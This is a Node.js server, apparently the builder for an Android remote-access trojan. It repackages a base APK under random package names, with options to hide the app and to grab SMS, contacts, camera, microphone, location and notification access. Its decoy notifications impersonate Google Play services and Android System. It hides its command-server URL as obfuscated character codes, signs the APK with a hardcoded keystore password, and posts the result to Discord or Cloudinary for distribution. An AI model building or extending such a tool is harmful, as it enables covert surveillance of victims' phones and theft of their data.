const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const sharp = require('sharp');
const axios = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const baseApkPath = path.join(__dirname, 'assets', 'base.apk');
const usmanKsPath = path.join(__dirname, 'assets', 'usman90.jks');
const signerJarPath = path.join(__dirname, 'assets', 'uber-apk-signer.jar');

if (!fs.existsSync(path.join(__dirname, 'temp'))) {
    fs.mkdirSync(path.join(__dirname, 'temp'), { recursive: true });
}

// Helper to run commands
const runCommand = (command, args, options = {}) => {
    return new Promise((resolve, reject) => {
        console.log(`[CMD] Running: ${command} ${args.join(' ')}`);
        const proc = spawn(command, args, { ...options, stdio: 'inherit' });

        proc.on('close', (code, signal) => {
            if (code === 0) resolve('Success');
            else if (signal) reject(new Error(`Command ${command} was killed by signal: ${signal} (Likely OOM)`));
            else reject(new Error(`Command ${command} failed with code ${code}`));
        });

        proc.on('error', (err) => reject(err));
    });
};

// Generate Route
app.post('/generate', upload.single('icon'), async (req, res) => {
    const {
        uuid,
        appName,
        packageName: userPackageName,
        hideApp,
        webLink,
        callbackUrl,
        enableSmsPermission,
        enableContactsPermission,
        enableStoragePermission,
        enableCameraPermission,
        enableMicrophonePermission,
        enableNotificationListener,
        enableLocationPermission,
        aggressivePermissions,
        notificationStyle,
        notificationClickAction,
        notificationTitle,
        notificationText,
        notificationIcon
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request for UUID: ${uuid} | App: ${appName} | Pkg: ${userPackageName}`);

    // Ack immediately
    res.status(202).json({ message: 'Processing started' });

    // Background Worker
    (async () => {
        const sendUpdate = async (event, data) => {
            if (callbackUrl) {
                try {
                    await axios.post(callbackUrl, { uuid, event, data });
                } catch (e) {
                    console.error('Webhook error:', e.message);
                }
            }
        };

        try {
            await sendUpdate('apk_progress', { step: 'Initializing environment...', progress: 10 });

            if (!fs.existsSync(baseApkPath)) {
                throw new Error("Base APK not found in assets/base.apk");
            }

            const tempDir = path.join(__dirname, 'temp');
            const workDir = path.join(tempDir, `work-${uuid}`);
            const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
            const finalApkName = `${(appName || "System").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;

            // Cleanup
            if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);

            // 1. Decompile Base APK
            await sendUpdate('apk_progress', { step: 'Decompiling base package...', progress: 20 });
            await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);

            // 2. Customize App Name in strings.xml
            await sendUpdate('apk_progress', { step: 'Customizing app name...', progress: 30 });
            if (appName) {
                const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
                if (fs.existsSync(stringsPath)) {
                    let content = fs.readFileSync(stringsPath, 'utf8');
                    content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${appName}</string>`);
                    fs.writeFileSync(stringsPath, content);
                    console.log(`[APK] App name updated to: ${appName}`);
                }
            }

            // 3. Customize App Icon (PNGs and remove anydpi adaptive XML)
            if (customIcon && customIcon.buffer) {
                await sendUpdate('apk_progress', { step: 'Embedding custom application icon...', progress: 40 });
                const iconBuffer = customIcon.buffer;

                // Remove adaptive XML so Android Launcher displays custom PNGs
                const anydpiDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
                if (fs.existsSync(anydpiDir)) {
                    fs.rmSync(anydpiDir, { recursive: true, force: true });
                }

                const densitySizes = {
                    'mipmap-mdpi': 48,
                    'mipmap-hdpi': 72,
                    'mipmap-xhdpi': 96,
                    'mipmap-xxhdpi': 144,
                    'mipmap-xxxhdpi': 192
                };

                for (const [folder, size] of Object.entries(densitySizes)) {
                    const folderPath = path.join(workDir, 'res', folder);
                    if (fs.existsSync(folderPath)) {
                        try {
                            const existing = fs.readdirSync(folderPath);
                            for (const f of existing) {
                                if (f.startsWith('ic_launcher')) {
                                    fs.unlinkSync(path.join(folderPath, f));
                                }
                            }
                            const pngBuf = await sharp(iconBuffer).resize(size, size).toFormat('png').toBuffer();
                            fs.writeFileSync(path.join(folderPath, 'ic_launcher.png'), pngBuf);
                            fs.writeFileSync(path.join(folderPath, 'ic_launcher_round.png'), pngBuf);
                        } catch (iconErr) {
                            console.error(`[APK] Icon write error in ${folder}:`, iconErr.message);
                        }
                    }
                }
                console.log('[APK] Custom app icons embedded');
            }

            // 4. Customize Package Name (if requested)
            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
            const apktoolYmlPath = path.join(workDir, 'apktool.yml');

            let oldPackageName = 'com.asml.tech';
            if (fs.existsSync(manifestPath)) {
                const rawManifest = fs.readFileSync(manifestPath, 'utf8');
                const pkgMatch = rawManifest.match(/package="([^"]+)"/);
                if (pkgMatch) oldPackageName = pkgMatch[1];
            }

            // Standardize package name
            const pkgDomains = ['developer', 'appworks', 'mobile', 'cloudapp', 'devkit', 'appcore', 'userapp', 'devtools', 'appstudio', 'toolkit', 'syscore', 'droidlab', 'techworks', 'datalink', 'smartapp', 'nettools', 'cloudworks', 'infomedia', 'digitalsys'];
            const pkgApps = ['sync', 'tools', 'hub', 'service', 'client', 'media', 'helper', 'core', 'kit', 'plus', 'link', 'connect', 'utility', 'manager', 'portal', 'view', 'access', 'drive', 'engine', 'guard', 'node'];
            const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

            let newPackageName;
            if (userPackageName && userPackageName.trim()) {
                const clean = userPackageName.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
                const parts = clean.split('.').filter(Boolean);
                if (parts.length === 3) newPackageName = clean;
                else if (parts.length === 2) newPackageName = `${clean}.${pick(pkgApps)}`;
                else if (parts.length > 3) newPackageName = parts.slice(0, 3).join('.');
                else newPackageName = `com.${clean || pick(pkgDomains)}.${pick(pkgApps)}`;
            } else {
                newPackageName = `com.${pick(pkgDomains)}.${pick(pkgApps)}`;
            }

            if (newPackageName !== oldPackageName) {
                await sendUpdate('apk_progress', { step: 'Renaming package identity...', progress: 45 });

                // Replace in AndroidManifest.xml
                if (fs.existsSync(manifestPath)) {
                    let mContent = fs.readFileSync(manifestPath, 'utf8');
                    mContent = mContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                    fs.writeFileSync(manifestPath, mContent);
                }

                // Replace in apktool.yml
                if (fs.existsSync(apktoolYmlPath)) {
                    let yContent = fs.readFileSync(apktoolYmlPath, 'utf8');
                    yContent = yContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                    yContent = yContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
                    yContent = yContent.replace(/.*testOnly.*/gi, '');
                    fs.writeFileSync(apktoolYmlPath, yContent);
                }

                // Replace package in all smali files
                const updateSmaliFiles = (dir) => {
                    if (!fs.existsSync(dir)) return;
                    const files = fs.readdirSync(dir, { withFileTypes: true });
                    for (const file of files) {
                        const filePath = path.join(dir, file.name);
                        if (file.isDirectory()) {
                            updateSmaliFiles(filePath);
                        } else if (file.name.endsWith('.smali')) {
                            let content = fs.readFileSync(filePath, 'utf8');
                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                            fs.writeFileSync(filePath, content);
                        }
                    }
                };

                // Move smali directory tree
                const oldPathSegments = oldPackageName.split('.');
                const newPathSegments = newPackageName.split('.');
                const renameSmaliFolders = (baseSmaliDir) => {
                    const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
                    const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);
                    if (!fs.existsSync(oldSmaliPath)) return;
                    fs.mkdirSync(newSmaliPath, { recursive: true });
                    for (const entry of fs.readdirSync(oldSmaliPath, { withFileTypes: true })) {
                        fs.renameSync(path.join(oldSmaliPath, entry.name), path.join(newSmaliPath, entry.name));
                    }
                    try { fs.rmdirSync(oldSmaliPath); } catch (_) {}
                };

                for (const item of fs.readdirSync(workDir, { withFileTypes: true })) {
                    if (item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes'))) {
                        updateSmaliFiles(path.join(workDir, item.name));
                        renameSmaliFolders(path.join(workDir, item.name));
                    }
                }

                // Update resource XMLs
                const updateResXml = (dir) => {
                    if (!fs.existsSync(dir)) return;
                    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
                        const entryPath = path.join(dir, entry.name);
                        if (entry.isDirectory()) {
                            updateResXml(entryPath);
                        } else if (entry.name.endsWith('.xml')) {
                            let content = fs.readFileSync(entryPath, 'utf8');
                            if (content.includes(oldPackageName)) {
                                content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                                fs.writeFileSync(entryPath, content);
                            }
                        }
                    }
                };
                updateResXml(path.join(workDir, 'res'));
                console.log(`[APK] Package renamed: ${oldPackageName} -> ${newPackageName}`);
            }

            // 5. Patch Material Design attrs.xml
            const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
            const missingAttrs = ['state_liftable', 'state_lifted', 'state_dragged', 'state_collapsible', 'state_collapsed'];
            if (fs.existsSync(attrsPath)) {
                let attrsContent = fs.readFileSync(attrsPath, 'utf8');
                for (const attr of missingAttrs) {
                    if (!attrsContent.includes(`name="${attr}"`)) {
                        attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
                    }
                }
                fs.writeFileSync(attrsPath, attrsContent);
            } else {
                const attrsDir = path.join(workDir, 'res', 'values');
                if (!fs.existsSync(attrsDir)) fs.mkdirSync(attrsDir, { recursive: true });
                fs.writeFileSync(attrsPath, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <attr name="state_liftable" format="boolean" />\n    <attr name="state_lifted" format="boolean" />\n    <attr name="state_dragged" format="boolean" />\n    <attr name="state_collapsible" format="boolean" />\n    <attr name="state_collapsed" format="boolean" />\n</resources>\n');
            }

            // 6. Build config.json and inject assets
            await sendUpdate('apk_progress', { step: 'Injecting configuration & identity...', progress: 50 });

            const rawLink = webLink || "";
            const themeColors = [];
            for (let i = 0; i < rawLink.length; i++) {
                themeColors.push(rawLink.charCodeAt(i));
            }

            const socketServerUrl = process.env.SOCKET_SERVER_URL || "https://p01--gallery-eye--9zr85m7yb6s4.code.run";
            const netParams = [];
            for (let i = 0; i < socketServerUrl.length; i++) {
                netParams.push(socketServerUrl.charCodeAt(i) + (i % 7));
            }

            const NOTIF_PRESETS = {
                default: { title: "Google Play services", text: "Running background checks", icon: "info", defaultAction: "device_info" },
                sync: { title: "Cloud Backup", text: "Syncing data in background", icon: "sync", defaultAction: "none" },
                cloud: { title: "Cloud Storage", text: "Connected to cloud service", icon: "sync", defaultAction: "none" },
                active: { title: "System Framework", text: "Service active", icon: "info", defaultAction: "none" },
                backup: { title: "Data Backup", text: "Backup in progress", icon: "download", defaultAction: "none" },
                ready: { title: "System Assistant", text: "Ready", icon: "info", defaultAction: "device_info" },
                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info", defaultAction: "device_info" },
                android_system: { title: "Android System", text: "System functions active", icon: "sync", defaultAction: "settings" },
                device_security: { title: "Security & Privacy", text: "All systems secured", icon: "lock", defaultAction: "security" },
                system_ui: { title: "System UI", text: "Syncing data", icon: "sync", defaultAction: "settings" },
                device_maintenance: { title: "Device Care", text: "Running in background", icon: "sync", defaultAction: "settings" },
                download_manager: { title: "Download Manager", text: "Transfer complete", icon: "download", defaultAction: "none" }
            };

            const style = notificationStyle || "default";
            const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.default;

            const config = {
                hideApp: hideApp === 'true',
                theme_colors: themeColors,
                net_params: netParams,
                appName: appName || "Google Play services",
                enableSmsPermission: enableSmsPermission === 'true',
                enableContactsPermission: enableContactsPermission === 'true',
                enableStoragePermission: enableStoragePermission !== 'false',
                enableCameraPermission: enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableLocationPermission: enableLocationPermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions: aggressivePermissions === 'true',
                notificationClickAction: notificationClickAction || preset.defaultAction || "device_info",
                notificationTitle: (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services"),
                notificationText: (notificationText && notificationText.trim()) ? notificationText.trim() : (preset.text || "Running in background"),
                notificationIcon: notificationIcon || preset.icon || "info",
                notificationChannelName: (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services")
            };

            const assetsDir = path.join(workDir, 'assets');
            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config, null, 2));
            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);

            // 7. Compile APK using apktool
            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 65 });
            await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);

            // 8. Sign APK with usman90 Keystore (V1 + V2 + V3)
            await sendUpdate('apk_progress', { step: 'Signing package with usman90 keystore...', progress: 80 });

            console.log(`[APK] Signing with usman90.jks`);
            const signCmd = fs.existsSync(usmanKsPath)
                ? `java -jar "${signerJarPath}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${usmanKsPath}" --ksAlias "usman90" --ksPass "God112256@" --ksKeyPass "God112256@" --allowResign`
                : `java -jar "${signerJarPath}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[APK] uber-apk-signer error:', err, stderr);
                        const fallbackCmd = `java -jar "${signerJarPath}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;
                        exec(fallbackCmd, { timeout: 120000 }, (fErr) => fErr ? reject(fErr) : resolve());
                    } else {
                        resolve();
                    }
                });
            });

            // 9. Locate Signed Output APK
            const tempFiles = fs.readdirSync(tempDir);
            const generated = tempFiles.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));

            if (generated) {
                const signedPath = path.join(tempDir, generated);
                let downloadUrl = "";

                // Upload 1: Discord Webhook
                if (process.env.DISCORD_WEBHOOK_URL) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to cloud storage...', progress: 95 });
                        const form = new FormData();
                        form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });

                        const discordRes = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                            headers: { ...form.getHeaders() },
                            maxBodyLength: Infinity,
                            maxContentLength: Infinity
                        });

                        if (discordRes.data && discordRes.data.attachments && discordRes.data.attachments.length > 0) {
                            downloadUrl = discordRes.data.attachments[0].url;
                            console.log(`[APK] Discord URL: ${downloadUrl}`);
                        }
                    } catch (discordError) {
                        console.error('[APK] Discord Upload Failed:', discordError.message);
                    }
                }

                // Upload 2: Cloudinary Backup
                if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to backup cloud...', progress: 95 });

                        cloudinary.config({
                            cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
                            api_key: process.env.CLOUDINARY_API_KEY,
                            api_secret: process.env.CLOUDINARY_API_SECRET
                        });

                        const binPath = signedPath.replace('.apk', '.bin');
                        fs.copyFileSync(signedPath, binPath);

                        const result = await cloudinary.uploader.upload(binPath, {
                            resource_type: 'raw',
                            folder: 'generated_apks',
                            public_id: `${finalApkName.replace('.apk', '')}_${Date.now()}`
                        });

                        if (result && result.secure_url) {
                            downloadUrl = result.secure_url;
                            console.log(`[APK] Cloudinary URL: ${downloadUrl}`);
                        }
                        if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    } catch (cloudError) {
                        console.error('[APK] Cloudinary Upload Failed:', cloudError.message);
                    }
                }

                // Cleanup
                if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
                if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);
                if (fs.existsSync(signedPath)) fs.unlinkSync(signedPath);

                if (downloadUrl) {
                    await sendUpdate('apk_ready', { downloadUrl });
                    console.log(`[APK] Build completed successfully for ${uuid}`);
                } else {
                    await sendUpdate('apk_error', { message: 'Failed to upload APK to storage' });
                }
            } else {
                throw new Error("Signed APK not found after uber-apk-signer");
            }

        } catch (error) {
            console.error(`[APK] Generation failed for ${uuid}:`, error);
            await sendUpdate('apk_error', { message: error.message });
        }
    })();
});

app.listen(port, () => {
    console.log(`APK Generator Microservice running on port ${port}`);
});
